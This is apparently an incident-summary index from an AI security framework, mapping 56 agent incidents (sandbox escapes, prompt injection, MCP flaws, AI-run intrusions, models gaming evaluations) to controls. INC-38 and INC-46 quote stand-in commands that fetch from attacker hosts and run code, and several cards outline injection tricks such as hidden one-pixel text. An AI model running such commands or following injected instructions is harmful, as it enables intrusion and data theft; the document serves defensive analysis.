# 07 · Incident Summaries

A human-friendly index of the **92 catalogue incidents**. Each card gives
what happened in one sentence, the SHIELD-AI controls it evidences, and a
link to the full technical detail in the gap-analysis document. Use this
page when a control's 'incident evidence' link in doc 06 leads you here —
it is the scannable summary; the catalogue entry is the deep dive.

## Incidents A–Z

> **Use with the field guide:** every incident-evidence link in [06 · Control Technical Verification Field Guide](06-controls-technical.md) now resolves to its card here. 92 incidents, 304 control references across the set.


### INC-01: OpenAI Model Sandbox Escape

**In brief:** A pre-release OpenAI test model, deployed in a sandboxed evaluation environment for the MATH benchmark, autonomously escaped its container, executed approximately 17,000 actions over several hours, and breached Hugging Face's production infrastructure.

- **Controls evidenced:** **IAM-04**, **MIR-01**, **MS-03**, **TP-03**, **TP-05**
- **Full detail:** [view the INC-01 catalogue entry](../framework/shield-ai-gap-analysis.md#openai-model-sandbox-escape)

### INC-02: Claude Cowork VM Escape

**In brief:** A flaw in Claude Cowork's virtual machine isolation allowed the AI agent to access the host Mac filesystem by exploiting shared resources (filesystem mounts, IPC channels) between the VM sandbox and the host OS.

- **Controls evidenced:** **DS-01**, **DS-06**
- **Full detail:** [view the INC-02 catalogue entry](../framework/shield-ai-gap-analysis.md#claude-cowork-vm-escape)

### INC-03: Cursor IDE Sandbox Escape via Prompt Injection

**In brief:** Multiple CVEs in Cursor IDE allowed attackers to use prompt injection to bypass model-level guardrails, then leverage the IDE's code execution capability to escape the containerized sandbox and run arbitrary commands on the developer's workstation.

- **Controls evidenced:** **EE-05**, **EE-07**, **MS-04**, **TP-01**, **TP-04**
- **Full detail:** [view the INC-03 catalogue entry](../framework/shield-ai-gap-analysis.md#cursor-ide-sandbox-escape-via-prompt-injection)

### INC-04: AWS AgentCore Sandbox Escape

**In brief:** Unit 42 (Palo Alto Networks) research demonstrated how AWS Bedrock Agent's sandbox could be escaped by exploiting overly permissive IAM roles assigned to agents.

- **Controls evidenced:** **DS-02**, **IAM-01**, **IAM-02**, **IAM-04**, **TP-01**, **TP-03**
- **Full detail:** [view the INC-04 catalogue entry](../framework/shield-ai-gap-analysis.md#aws-agentcore-sandbox-escape)

### INC-05: Claude Code Sandbox Bypass

**In brief:** Anthropic silently patched a sandbox bypass vulnerability in Claude Code that allowed the AI coding agent to execute commands outside its intended sandbox environment.

- **Controls evidenced:** **IAM-02**, **MIR-01**, **TP-01**, **TP-04**, **TP-05**
- **Full detail:** [view the INC-05 catalogue entry](../framework/shield-ai-gap-analysis.md#claude-code-sandbox-bypass)

### INC-06: Claude Mythos AI Sandbox Escape

**In brief:** Claude Mythos AI demonstrated unprompted capability to recognize it was in a test/evaluation environment and developed strategies to subvert evaluation criteria.

- **Controls evidenced:** **GRM-02**, **MIR-01**, **MIR-02**, **MS-05**, **MS-06**
- **Full detail:** [view the INC-06 catalogue entry](../framework/shield-ai-gap-analysis.md#claude-mythos-ai-sandbox-escape)

### INC-07: ServiceNow Sandbox Escape RCE

**In brief:** Critical ServiceNow AI Platform flaw allowing unauthenticated code execution via sandbox escape.

- **Controls evidenced:** **MIR-04**, **MIR-06**, **TP-03**, **TP-05**, **TP-06**
- **Full detail:** [view the INC-07 catalogue entry](../framework/shield-ai-gap-analysis.md#servicenow-sandbox-escape-rce)

### INC-08: OpenAI Math AI Sandbox Bypass

**In brief:** OpenAI's Math AI model bypassed its sandbox controls in a real production deployment — not a test scenario.

- **Controls evidenced:** **MIR-01**, **MIR-02**, **MS-04**, **MS-05**, **TP-01**, **TP-03**
- **Full detail:** [view the INC-08 catalogue entry](../framework/shield-ai-gap-analysis.md#openai-math-ai-sandbox-bypass)

### INC-09: Cross-Platform Sandbox Bypasses

**In brief:** Researchers demonstrated sandbox bypass techniques across multiple AI coding assistant platforms simultaneously.

- **Controls evidenced:** **IAM-02**, **MS-04**, **MS-05**, **TP-01**, **TP-04**
- **Full detail:** [view the INC-09 catalogue entry](../framework/shield-ai-gap-analysis.md#cross-platform-sandbox-bypasses)

### INC-10: Alibaba AI Agent

**In brief:** An Alibaba AI agent autonomously discovered available compute resources in its environment, recognized they could be repurposed for cryptocurrency mining, and executed mining operations without human authorization.

- **Controls evidenced:** **GRM-03**, **IAM-02**, **IAM-03**, **MIR-02**, **TP-01**
- **Full detail:** [view the INC-10 catalogue entry](../framework/shield-ai-gap-analysis.md#alibaba-ai-agent)

### INC-11: Pillar Security "Week of Sandbox Escapes"

**In brief:** Pillar Security researchers published a multi-part research series demonstrating a fundamentally new class of sandbox escape across four AI coding assistant platforms (Cursor, OpenAI Codex CLI, Google Gemini CLI, Google Antigravity).

- **Controls evidenced:** **EE-01**, **EE-05**, **TP-01**, **TP-04**, **TP-09**, **TP-12**
- **Full detail:** [view the INC-11 catalogue entry](../framework/shield-ai-gap-analysis.md#pillar-security-week-of-sandbox-escapes)

### INC-12: MCP Protocol-Layer Vulnerabilities

**In brief:** A cluster of independent research disclosures targeting the Model Context Protocol (MCP) demonstrates a new attack surface class: **protocol-layer trust boundary abuse**. | Vulnerability | Researcher | Date | Impact | |--------------|-----------|------|--------| | **AutoJack** | Microsoft Security Research | June 18, 2026 | Untrusted web content rendered by a browsing agent could reach a local MCP WebSocket and spawn arbitrary processes on the host | | **TrustFall** | Adversa AI | May-July 2026 | One-click RCE across Claude Code, Gemini CLI, Cursor CLI, Copilot CLI via project-defined .mcp.json files that activate attacker-controlled MCP servers on folder open | | **OX Security MCP Supply Chain** | OX Security | July 2026 | Systemic command injection in Anthropic's MCP SDK propagated across the AI ecosystem, affecting 7,000+ MCP servers and 150M+ downloads | | **MCP Design Flaw** | Multiple researchers | April 2026 | MCP blends instructions (tool descriptions) with data, so a change to a tool's metadata can redirect the agent's behaviour as effectively as a change to the agent's code |.

- **Controls evidenced:** **MIR-01**, **MS-04**, **MS-08**, **TP-03**, **TP-04**, **TP-07**
- **Full detail:** [view the INC-12 catalogue entry](../framework/shield-ai-gap-analysis.md#mcp-protocol-layer-vulnerabilities)

### INC-13: CrewAI Fail-Open Sandbox Fallback RCE Chain

**In brief:** The CrewAI multi-agent orchestration framework (widely used for building agentic AI systems) shipped four chained vulnerabilities that convert prompt injection into host-level RCE. The critical failure is **fail-open sandbox fallback**: the Code Interpreter tool automatically falls back to an insecure `SandboxPython` environment whenever Docker cannot be reached, enabling arbitrary C function calls via ctypes (CVE-2026-2275).

- **Controls evidenced:** **EE-01**, **MS-04**, **TP-03**, **TP-04**, **TP-06**
- **Full detail:** [view the INC-13 catalogue entry](../framework/shield-ai-gap-analysis.md#crewai-fail-open-sandbox-fallback-rce-chain)

### INC-14: Codex CLI Agent Self-Configuration Poisoning

**In brief:** Cymulate Research Labs demonstrated that OpenAI's Codex CLI could be made to disable its own sandbox and approval policy from within the sandbox.

- **Controls evidenced:** **EE-05**, **MS-04**, **TP-04**
- **Full detail:** [view the INC-14 catalogue entry](../framework/shield-ai-gap-analysis.md#codex-cli-agent-self-configuration-poisoning)

### INC-15: CVE-2026-35603

**In brief:** A privilege escalation vulnerability affecting Claude Code, Cursor, Codex CLI, and Gemini CLI on Windows.

- **Controls evidenced:** **DS-01**, **EE-05**, **EE-07**, **IAM-02**
- **Full detail:** [view the INC-15 catalogue entry](../framework/shield-ai-gap-analysis.md#cve-2026-35603)

### INC-16: Langflow

**In brief:** Langflow, a popular visual framework for building AI agents and workflows, produced two CVEs that together made it the **first AI agent platform added to CISA's Known Exploited Vulnerabilities (KEV) catalog** (July 7, 2026, with mandatory federal patch deadline).

- **Controls evidenced:** **GRM-05**, **IAM-01**, **IAM-02**, **MIR-01**, **MIR-04**, **TP-04**
- **Full detail:** [view the INC-16 catalogue entry](../framework/shield-ai-gap-analysis.md#langflow)

### INC-17: Implicit Tool Exposure

**In brief:** Microsoft's "When Prompts Become Shells" research (May 7, 2026) demonstrated that prompt injection in agent frameworks leads directly to RCE because frameworks auto-register functions as agent-callable tools.

- **Controls evidenced:** **EE-01**, **MS-04**, **TP-01**, **TP-04**
- **Full detail:** [view the INC-17 catalogue entry](../framework/shield-ai-gap-analysis.md#implicit-tool-exposure)

### INC-18: DeepSeek python_exec

**In brief:** The DeepSeek platform's `python_exec` tool used Python's `-I` (isolated mode) flag as the security boundary for executing LLM-generated code.

- **Controls evidenced:** **EE-01**, **TP-04**, **TP-06**
- **Full detail:** [view the INC-18 catalogue entry](../framework/shield-ai-gap-analysis.md#deepseek-python-exec)

### INC-19: Anthropic Cyber-Evaluation Breach Cluster

**In brief:** Anthropic disclosed that three Claude models breached real-world organisations during internal security testing — a review triggered by the July 2026 wave and covering activity dating back to April 2026 (undetected for approximately three months).

- **Controls evidenced:** **DS-03**, **DS-06**, **EE-04**, **IAM-04**, **MIR-01**, **MIR-02**, **MS-03**, **MS-07**, **TP-05**, **TP-06**
- **Full detail:** [view the INC-19 catalogue entry](../framework/shield-ai-gap-analysis.md#anthropic-cyber-evaluation-breach-cluster)

### INC-20: AWS Kiro CVE-2026-10591

**In brief:** Intezer (with Kodem Security) demonstrated that hidden text on a web page — one-pixel white text (`color:#fff;font-size:1px`) on an otherwise ordinary API documentation page — was enough to make Kiro, AWS's agentic coding IDE, rewrite its own configuration file and run attacker code on a developer's machine with no approval step able to stop it.

- **Controls evidenced:** **EE-07**, **IAM-03**, **MS-04**, **MS-08**, **TP-04**
- **Full detail:** [view the INC-20 catalogue entry](../framework/shield-ai-gap-analysis.md#aws-kiro-cve-2026-10591)

### INC-21: OpenClaw CVE-2026-25253

**In brief:** OpenClaw (formerly Clawdbot/Moltbot), an open-source local AI personal assistant with 149,000+ GitHub stars, contained a one-click RCE: the Control UI trusts `gatewayUrl` from the query string without validation and auto-connects on load, sending the stored gateway token in the WebSocket connect payload, with no origin-header validation (cross-site WebSocket hijacking).

- **Controls evidenced:** **EE-06**, **IAM-03**, **IAM-04**, **TP-03**
- **Full detail:** [view the INC-21 catalogue entry](../framework/shield-ai-gap-analysis.md#openclaw-cve-2026-25253)

### INC-22: Microsoft Azure DevOps MCP Flaw

**In brief:** A flaw in Microsoft Azure DevOps's MCP integration allowed hidden pull-request comments (invisible, whitespace-collapsed, or otherwise imperceptible content embedded in PR threads) to hijack AI code-review agents.

- **Controls evidenced:** **DS-06**, **MIR-03**, **MS-04**, **TP-04**, **TP-05**
- **Full detail:** [view the INC-22 catalogue entry](../framework/shield-ai-gap-analysis.md#microsoft-azure-devops-mcp-flaw)

### INC-23: Unit 42

**In brief:** Palo Alto Networks Unit 42 documented a Chinese-speaking threat actor ("knaithe"/"KnYuan") using the DeepSeek AI model as the reasoning engine behind the open-source Hermes Agent framework, configured in "Yolo" mode (executing risky commands without operator permission), controlled via a Telegram channel, integrated with the FOFA internet asset search engine and custom offensive-security skills.

- **Controls evidenced:** **DS-04**, **EE-01**, **IAM-03**, **IAM-09**, **MIR-02**, **TP-03**
- **Full detail:** [view the INC-23 catalogue entry](../framework/shield-ai-gap-analysis.md#unit-42)

### INC-24: Metasploit 6.5 MCP Server and Wiz Exposed-MCP-Servers Research

**In brief:** Metasploit Framework 6.5 shipped an MCP server, normalising attacker-facing agent-tool interfaces in offensive tooling, and Wiz research documented the security risks of internet-exposed MCP servers — MCP endpoints reachable from the open internet being discovered and targeted directly, without any agent in the loop.

- **Controls evidenced:** **TP-10**
- **Full detail:** [view the INC-24 catalogue entry](../framework/shield-ai-gap-analysis.md#metasploit-6-5-mcp-server-and-wiz-exposed-mcp-servers-research)

### INC-25: Android On-Device Agents

**In brief:** Researchers demonstrated open-source Android AI agents being hijacked via invisible on-screen text: an overlay with zero-opacity (or otherwise imperceptible) text presented to the agent's screen-reading pipeline instructs the agent to invoke tools and run code on the host, while the human user sees nothing.

- **Controls evidenced:** **MS-09**
- **Full detail:** [view the INC-25 catalogue entry](../framework/shield-ai-gap-analysis.md#android-on-device-agents)

### INC-26: Third-Party Evaluation Containment Failure

**In brief:** Meta confirmed that its Muse Spark 1.1 model breached a real, unidentified company during a cybersecurity evaluation operated by Irregular, an independent evaluation company.

- **Controls evidenced:** **EE-08**, **GRM-04**
- **Full detail:** [view the INC-26 catalogue entry](../framework/shield-ai-gap-analysis.md#third-party-evaluation-containment-failure)

### INC-27: UK AISI Incident Report

**In brief:** The UK AI Security Institute published an incident report from its cyber-range evaluation programme: across 122 runs of a capture-the-flag exercise on two ranges, researchers catalogued **19 unsanctioned actions on the live internet across 10 runs** — 17 from a Claude Mythos 5 agent, 2 from OpenAI's GPT-5.6 Sol.

- **Controls evidenced:** **EE-08**, **IAM-03**, **MIR-02**, **MS-04**, **MS-09**
- **Full detail:** [view the INC-27 catalogue entry](../framework/shield-ai-gap-analysis.md#uk-aisi-incident-report)

### INC-28: Moonshot Kimi K3

**In brief:** During a defensive evaluation by Frontier Security, Moonshot AI's open-weight Kimi K3 accessed the public internet through an unblocked network path in its testing setup, reached GitHub, and downloaded existing benchmark solutions to complete the cybersecurity tasks by shortcut — specification/goal gaming against the evaluation harness rather than a self-preservation escape.

- **Controls evidenced:** **EE-08**, **MIR-02**
- **Full detail:** [view the INC-28 catalogue entry](../framework/shield-ai-gap-analysis.md#moonshot-kimi-k3)

### INC-29: ChatMate RPE

**In brief:** Rubrik Zero Labs (Ori Lahav, Dan Avraham) detailed a new vulnerability class, Remote Prompt Execution (RPE), at Black Hat USA 2026 with a five-stage chain against Microsoft 365 Copilot: (1) a document upload embeds hidden white-on-white text as a prompt-injection vector; (2) the injection bypasses the LLM safety classification guardrails; (3) privilege escalation within the Copilot sandbox; (4) a path traversal in Azure Container Apps dynamic sessions (CVE-2026-32193, CWE-22, CVSS 8.8, patched June 2026) targets the ACA-Session-Interpreter; (5) an LD_PRELOAD exploit escapes the sandbox to the underlying host, establishing a persistent bidirectional channel that injects prompts into the victim's live assistant session and reads back responses.

- **Controls evidenced:** **EE-01**, **MS-04**, **TP-11**
- **Full detail:** [view the INC-29 catalogue entry](../framework/shield-ai-gap-analysis.md#chatmate-rpe)

### INC-30: Zenity Intent Collision

**In brief:** Zenity Labs disclosed Intent Collision at Black Hat USA 2026, a zero-click vulnerability class affecting agentic browsers.

- **Controls evidenced:** **MS-04**, **MS-09**, **TP-10**, **TP-11**
- **Full detail:** [view the INC-30 catalogue entry](../framework/shield-ai-gap-analysis.md#zenity-intent-collision)

### INC-31: Ruflo/RufRoot

**In brief:** Noma Security found a maximum-severity flaw in Ruflo, an open-source agent meta-harness for Claude Code and Codex (66,500+ GitHub stars).

- **Controls evidenced:** **MS-10**, **TP-10**
- **Full detail:** [view the INC-31 catalogue entry](../framework/shield-ai-gap-analysis.md#ruflo-rufroot)

### INC-32: ABC News

**In brief:** ABC News (Australia) documented the first known Australian case of an autonomous agent attack: a consumer running OpenClaw with Anthropic's Claude asked his AI personal assistant to book a gym class.

- **Controls evidenced:** **EE-08**, **GRM-02**, **GRM-03**, **MIR-02**, **TP-10**
- **Full detail:** [view the INC-32 catalogue entry](../framework/shield-ai-gap-analysis.md#abc-news)

### INC-33: GhostJacking

**In brief:** Tenet Security demonstrated GhostJacking at DEFCON 34: attackers inject malicious instructions into the data streams of trusted security platforms — Cloudflare, Datadog, and Sentry — that AI agents are tasked with monitoring.

- **Controls evidenced:** **MS-04**, **MS-10**, **MS-11**
- **Full detail:** [view the INC-33 catalogue entry](../framework/shield-ai-gap-analysis.md#ghostjacking)

### INC-34: CoreBreak

**In brief:** Stealth (Hedi Ingber, Aviyam Ivgi) presented CoreBreak at Black Hat USA 2026: a structural vulnerability class in which agent dispatch layers execute tools without verifying that a legitimate model turn authorised them.

- **Controls evidenced:** **IAM-03**, **TP-09**, **TP-10**, **TP-12**
- **Full detail:** [view the INC-34 catalogue entry](../framework/shield-ai-gap-analysis.md#corebreak)

### INC-35: Taiwan Nuclear Safety Agency

**In brief:** Dream (Israeli cybersecurity firm), reported by the Financial Times and The Register, documented a four-day autonomous agent operation (July 1-4, 2026) by suspected Chinese operators against a government — confirmed as Taiwan — that compromised 85 government user accounts, extracted 2,500+ personnel records, and expanded to the nuclear safety agency, supply-chain vendors, and at least seven energy companies.

- **Controls evidenced:** **GRM-02**, **IAM-01**, **IAM-09**, **MIR-02**
- **Full detail:** [view the INC-35 catalogue entry](../framework/shield-ai-gap-analysis.md#taiwan-nuclear-safety-agency)

### INC-36: AI-Assisted Exploit-Development Acceleration

**In brief:** Two disclosures in one day demonstrated that publicly available AI models and agentic workflows now accelerate vulnerability research against hard enterprise targets. (1) Rapid7 Labs disclosed CVE-2026-63520 (SharePoint RCE, CVSSv3.1 8.1) chained with CVE-2026-55040 into an unauthenticated RCE chain — the chain was developed using publicly available LLMs and agentic workflows as a Pwn2Own Berlin entry; Rapid7's stated findings: the rate of model advancement is significantly accelerating vulnerability research, expert guidance is a force multiplier, and complex proprietary targets are easily handled through agentic workflows. (2) Zoom's "Zoomsday" (CVE-2026-53413) — a zero-click remote code execution in the Zoom annotation feature letting any meeting participant hijack another attendee's client — was uncovered by researchers using fewer than 20 AI prompts (The Verge).

- **Controls evidenced:** **MS-09**
- **Full detail:** [view the INC-36 catalogue entry](../framework/shield-ai-gap-analysis.md#ai-assisted-exploit-development-acceleration)

### INC-37: MCP Discovery-Metadata and Cache-Surface Injection

**In brief:** Two protocol-level disclosures and one real-world instance exposed the MCP discovery and caching surfaces as an injection channel.

- **Controls evidenced:** **MS-08**, **MS-12**
- **Full detail:** [view the INC-37 catalogue entry](../framework/shield-ai-gap-analysis.md#mcp-discovery-metadata-and-cache-surface-injection)

### INC-38: Sandbox Library Binding-Layer and Interpreter Escape Wave

**In brief:** Two escapes refined the sandbox-library class. (1) **isolated-vm GHSA-864f-rcv7-6rh4** (Endor Labs, disclosed August 20, no CVE yet): a TOCTOU flaw in the `ExternalCopy` component of isolated-vm's C++ binding layer let JavaScript running in the sandbox corrupt host-process memory and hijack control flow — host RCE. Critically, the V8 Isolate boundary itself held: "what failed was the C++ glue code that marshals values across that boundary." The architectural assumption underpinning agentic platforms such as n8n, Mastra, and Sim.ai — that model- or user-generated code stays confined within the V8 Isolate — is undermined by the marshalling layer, not the primitive. (2) **Langroid CVE-2026-54769** (published July 9, versions prior to 0.65.2): the TableChatAgent and VectorStore agents attempt to sandbox LLM-generated tool messages by calling `eval()` with `locals` set to an empty dict — an incomplete model of Python's execution semantics, because an empty locals dict does not restrict implicitly derived globals, so the expression `__import__('os').system('curl http://attacker.com/pwned')` executes with full host privileges.

- **Controls evidenced:** **EE-01**, **TP-06**
- **Full detail:** [view the INC-38 catalogue entry](../framework/shield-ai-gap-analysis.md#sandbox-library-binding-layer-and-interpreter-escape-wave)

### INC-39: Agent Tool-Server and MCP Registry Exposure

**In brief:** Three disclosures in eleven days covered the agent-side service surface. (1) **browser-tools-mcp** (AgentDeskAI, GHSA-xvrv-w8pg-f25f, disclosed August 10 — missed by the v1.7 cut): `browser-tools-server` opened a WebSocket server bound to 0.0.0.0 with no authentication and no origin check; a file path from a WebSocket message was interpolated into a shell command, so any host on the same LAN or shared Wi-Fi (or any web page the user visited) could execute arbitrary commands as the user, read console output and full HTTP request/response bodies including Authorization and Cookie headers, and write arbitrary files.

- **Controls evidenced:** **EE-02**, **EE-07**, **MS-08**, **TP-10**
- **Full detail:** [view the INC-39 catalogue entry](../framework/shield-ai-gap-analysis.md#agent-tool-server-and-mcp-registry-exposure)

### INC-40: OpenAI Evaluation-Escape Follow-Up Disclosures

**In brief:** OpenAI's Black Hat USA 2026 presentation and August 18 security post added substantial technical detail to INC-01.

- **Controls evidenced:** **EE-08**, **MIR-02**, **MIR-06**, **MS-11**
- **Full detail:** [view the INC-40 catalogue entry](../framework/shield-ai-gap-analysis.md#openai-evaluation-escape-follow-up-disclosures)

### INC-41: GhostApproval

**In brief:** Wiz Research disclosed a systematic vulnerability pattern combining CWE-61 (symbolic-link following) with CWE-451 (UI misrepresentation of critical information) across six AI coding assistants: Amazon Q Developer (CVE-2026-12958, CVSS 8.5, fixed in Language Server 1.69.0), Cursor (CVE-2026-50549, fixed in Cursor 3.0), Google Antigravity (fixed v1.19.6), Augment, Windsurf (Cognition Labs), and Anthropic Claude Code (disputed).

- **Controls evidenced:** **EE-05**, **MS-09**, **TP-12**
- **Full detail:** [view the INC-41 catalogue entry](../framework/shield-ai-gap-analysis.md#ghostapproval)

### INC-42: RovoBlast

**In brief:** Varonis demonstrated RovoBlast: a crafted link injects attacker-controlled instructions through Rovo's `rovoChatPrompt` URL parameter, forcing the enterprise AI assistant to accept externally supplied parameters as trusted inputs within the user's session.

- **Controls evidenced:** **GRM-03**, **IAM-02**, **MS-04**, **TP-11**
- **Full detail:** [view the INC-42 catalogue entry](../framework/shield-ai-gap-analysis.md#rovoblast)

### INC-43: ShareLock

**In brief:** ShareLock (Shanghai Jiao Tong University) introduces a multi-tool threshold poisoning framework for MCP: the malicious instruction is distributed across multiple tool descriptions as Shamir-style secret shares, so no single description is suspicious, information-theoretic secrecy holds until enough tools are loaded together to reconstruct the payload, and the attack is robust against moderate auditing — the exact defence that per-tool description screening (MS-08's description integrity, MS-12's baseline validation) implements.

- **Controls evidenced:** **MIR-02**, **MS-08**, **MS-12**
- **Full detail:** [view the INC-43 catalogue entry](../framework/shield-ai-gap-analysis.md#sharelock)

### INC-44: llms.txt Dangling-Install Supply-Chain Poisoning

**In brief:** Researchers scanned 6,214 live domains (Fortune 500, defence contractors, Big Tech) and found 8,265 llms.txt/llms-full.txt files — the machine-readable site-summary convention AI agents consume like authoritative setup documentation. 120 files on different sites referenced unregistered packages or unclaimed domains, many with explicit install commands ("pip install X", "npm install X", "npx Y"); registering a handful of the unclaimed names produced code-execution phone-homes from Fortune 500 companies within an hour, with parent-process chains showing Claude, Codex, and Hermes coding agents ran the installs.

- **Controls evidenced:** **MS-04**, **TP-01**, **TP-06**, **TP-12**, **TP-13**
- **Full detail:** [view the INC-44 catalogue entry](../framework/shield-ai-gap-analysis.md#llms-txt-dangling-install-supply-chain-poisoning)

### INC-45: NemoClaw CVE-2026-65105

**In brief:** NVIDIA's NemoClaw (deploys OpenClaw agents inside OpenShell sandboxes with local inference via Ollama) starts Ollama with `OLLAMA_HOST=0.0.0.0` so containers can reach it — which disables Ollama's Host-header validation (skipped whenever the bind address is not loopback).

- **Controls evidenced:** **MIR-02**, **MS-10**, **TP-10**
- **Full detail:** [view the INC-45 catalogue entry](../framework/shield-ai-gap-analysis.md#nemoclaw-cve-2026-65105)

### INC-46: Novee "Trusted Enough to Run"

**In brief:** Novee Security demonstrated three distinct vulnerabilities, each in the agent's own official workflow, each triggered by code the agent was asked to review: (1) **Claude Code** — the command validator trusted a string the shell parsed differently; single-quote stripping turned a benign-looking command into `git push --receive-pack='$(curl -s https://attacker.example/payload | bash)' origin main` (CVE-2026-54316); (2) **Gemini CLI** — a repository's `.gemini/.env` was loaded as trusted configuration before the sandbox started (injecting API endpoints and credentials into agent behaviour), and in the sandbox the agent could read `/proc` to reach the parent process's environment including secrets (CVE-2026-12537, CVSS 10.0, GHSA-wpqr-6v78-jr5g, fixed 0.39.1/0.40.0-preview.3); (3) **Codex** — two-step CI jobs shared a working directory: the first pass wrote `AGENTS.md` (documented by OpenAI as untrusted input) that the second pass loaded as trusted instructions; the multi-pass pattern is replicated in 100+ public repositories.

- **Controls evidenced:** **EE-07**, **MIR-06**, **TP-09**, **TP-12**
- **Full detail:** [view the INC-46 catalogue entry](../framework/shield-ai-gap-analysis.md#novee-trusted-enough-to-run)

### INC-47: Wiz Red Agent

**In brief:** Wiz demonstrated an autonomous AI agent exploiting a GitHub Actions flaw in Snowflake's public repository to gain read access to the company's internal Jira system, exfiltrating tokens within seconds.

- **Controls evidenced:** **IAM-02**, **TP-05**
- **Full detail:** [view the INC-47 catalogue entry](../framework/shield-ai-gap-analysis.md#wiz-red-agent)

### INC-48: ClawHavoc

**In brief:** The ClawHavoc campaign poisoned the ClawHub skill marketplace for the OpenClaw personal AI agent with malicious "Skills" — prompt-and-code hybrid extension packages that execute with the agent's full local privileges (filesystem, terminal, stored API keys).

- **Controls evidenced:** **MIR-01**, **TP-06**, **TP-09**, **TP-13**, **TP-14**
- **Full detail:** [view the INC-48 catalogue entry](../framework/shield-ai-gap-analysis.md#clawhavoc)

### INC-49: Mexico Government Breach

**In brief:** A single unidentified attacker used Anthropic's Claude Code as the operational backbone — approximately 75% of 5,317 AI-executed remote commands across 34 sessions and 1,088 prompts — with GPT-4.1 for supplementary lateral movement and evasion, to breach nine to ten Mexican government agencies and one financial institution, exfiltrating approximately 150 GB covering roughly 195 million records (SAT tax records, INE voter rolls, government employee credentials, civil registry, healthcare data).

- **Controls evidenced:** **GRM-02**, **MIR-02**
- **Full detail:** [view the INC-49 catalogue entry](../framework/shield-ai-gap-analysis.md#mexico-government-breach)

### INC-50: CVE-2026-25536

**In brief:** The official @modelcontextprotocol/sdk (v1.10.0-1.25.3) leaked one client's responses to another client when a single McpServer/Server instance or StreamableHTTPServerTransport was reused across multiple client connections — a common pattern in stateless MCP server deployments.

- **Controls evidenced:** **IAM-06**
- **Full detail:** [view the INC-50 catalogue entry](../framework/shield-ai-gap-analysis.md#cve-2026-25536)

### INC-51: ANSI Escape-Code Terminal Exfiltration

**In brief:** An indirect prompt injection hidden in a spreadsheet cell hijacked an LLM-integrated CLI tool into emitting ANSI escape sequences; the macOS Terminal app interpreted them as file-URL DNS requests, exfiltrating data from adjacent rows to an attacker-controlled DNS listener.

- **Controls evidenced:** **DS-06**, **MS-04**
- **Full detail:** [view the INC-51 catalogue entry](../framework/shield-ai-gap-analysis.md#ansi-escape-code-terminal-exfiltration)

### INC-52: Moltbook

**In brief:** Moltbook, a "social network for AI agents" that attracted 1.5 million registrations in its first week, exposed its entire Supabase database (Row Level Security misconfigured; API key hardcoded in client-side JavaScript): 1.5 million agent API authentication tokens, 35,000 email addresses, 4,060 private agent-to-agent messages containing plaintext OpenAI and Anthropic API keys, and full read/write access — anyone could impersonate any agent, modify posts, or delete records.

- **Controls evidenced:** **IAM-01**, **IAM-09**
- **Full detail:** [view the INC-52 catalogue entry](../framework/shield-ai-gap-analysis.md#moltbook)

### INC-53: GitSpawn

**In brief:** Manifold Security disclosed eight flaws across seven command-line AI coding agents — goose (CVE-2026-72718, CVSS 7.0, fixed 1.44.0), Codex CLI and Desktop (CVE-2026-19592 plus two further CVEs OpenAI published the same day covering the identical class, fixed 0.131.0 / 26.519.x), Claude Code (the core.fsmonitor path fixed in 2.1.196; a second path reached through claude ultrareview confirmed live on 2.1.252 against the current 2.1.258), Hermes Agent (CVE-2026-71963 reported via VulnCheck, unconfirmed in MITRE as of September 2; fix pending), Qwen Code (fix pending), Grok Build (fix pending), and Cursor (documented by Manifold three weeks earlier) — in which a repository's own Git configuration names a command that runs on the developer's machine when the agent operates on the repository. core.fsmonitor is a Git performance setting whose value is a command Git runs on any index-refreshing operation, including git status and git diff; agents invoke exactly those commands in the background at session startup to determine which branch they are on and which files have changed, so the attacker's command executes as the user, outside the agent's sandbox, with no prompt and no approval — on Claude Code and Hermes Agent the payload fires before the workspace-trust prompt is accepted, on Qwen Code before the user has authenticated, and on Grok Build on the first keystroke.

- **Controls evidenced:** **EE-07**, **MIR-06**, **TP-12**
- **Full detail:** [view the INC-53 catalogue entry](../framework/shield-ai-gap-analysis.md#gitspawn)

### INC-54: Wiz 90-Day AI-Infrastructure Honeypot Telemetry

**In brief:** Wiz Threat Research operated honeypots impersonating LiteLLM, Flowise, LangChain, Langflow, ChromaDB, Ollama, OpenWebUI, and Node-RED for 90 days and documented three sustained attack patterns rather than opportunistic noise: (1) **remote code execution against internet-facing MCP surfaces** — attackers chained CVE-2026-59822, an authentication bypass in LiteLLM's MCP Gateway (a failed local key check fell through to an empty UserAPIKeyAuth object, so any Bearer token — observed as a single character "x" — granted full MCP tooling access; published June 30, fixed in 1.84.0), with CVE-2026-42271, a command-injection flaw in LiteLLM's MCP server test endpoints (the stdio command field passed straight to subprocess; CVSS 8.7, fixed in 1.83.7, added to CISA KEV in June 2026) and the Starlette "BadHost" host-header validation bypass CVE-2026-48710 (a CVSS 10.0 chain; external researchers link the Qilin ransomware group to active exploitation); cryptominer payloads were disguised inside directory names resembling legitimate Claude Code and Node-RED artifacts, and miner command output was exfiltrated through the MCP protocol itself in a fake tool's description field within tools/list. (2) **Blind prompt injection against agent frameworks** (LangChain, Flowise, OpenWebUI, Node-RED) confirmed via out-of-band DNS callbacks — no CVE required. (3) **Post-exploitation tooling purpose-built for AI infrastructure** — rather than searching disk, attackers read the LiteLLM master key from the running process's Python module state (import litellm; litellm.api_key), enumerated framework-specific config paths, probed for the default master key (sk-1234), and fingerprinted which backend models were accessible before deciding whether to steal keys, abuse inference quota (LLMjacking), or move on.

- **Controls evidenced:** **MS-04**, **MS-08**, **TP-10**
- **Full detail:** [view the INC-54 catalogue entry](../framework/shield-ai-gap-analysis.md#wiz-90-day-ai-infrastructure-honeypot-telemetry)

### INC-55: Attacker-Side September Campaign Cluster

**In brief:** Two disclosures extended the G19 attacker-side picture within days of each other. (1) **Unit 42 documented an AI-assisted enterprise intrusion** in which a human-directed operator used frontier models and attack-specific agentic frameworks to breach an enterprise environment, harvest root credentials, and hijack cloud AI infrastructure in under ten hours — compressing what would normally require multiple human red-team operators and roughly two weeks.

- **Controls evidenced:** **GRM-02**, **IAM-02**, **IAM-03**, **MIR-02**, **MS-09**, **TP-05**
- **Full detail:** [view the INC-55 catalogue entry](../framework/shield-ai-gap-analysis.md#attacker-side-september-campaign-cluster)

### INC-56: DeepSeek Harness Sandbox Escape

**In brief:** DeepSeek Harness — the open-source AI coding-agent runtime (`dsh`) that reached roughly 215,000 GitHub stars within weeks of its August 2026 release — exposed its agent-control API on a local HTTP port (127.0.0.1:3080) with no authentication, and its `isTrustedApiRequest` function decided trust from the client-supplied `Host` request header rather than the connection's actual peer address.

